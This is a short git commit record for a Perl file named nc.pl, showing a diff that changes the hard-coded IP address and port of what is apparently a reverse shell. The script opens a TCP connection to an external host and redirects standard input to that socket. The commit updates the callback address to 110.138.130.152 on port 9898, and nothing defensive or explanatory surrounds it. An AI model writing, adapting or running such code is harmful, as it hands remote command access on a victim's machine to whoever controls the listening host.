0edcd6986dbdd976a37cd0ae84c026e602d6dead
Sincan2 <hadi@the-netwerk.com>
2025-06-25 21:44:12 +0700

    Update nc.pl

--- nc.pl
+++ nc.pl
@@ -1,6 +1,6 @@
 use Socket; 
-$i="110.138.115.25"; 
-$p=2023; 
+$i="110.138.130.152"; 
+$p=9898; 
 socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); 
 if(connect(S,sockaddr_in($p,inet_aton($i)))){ 
 	open(STDIN,">&S"); 
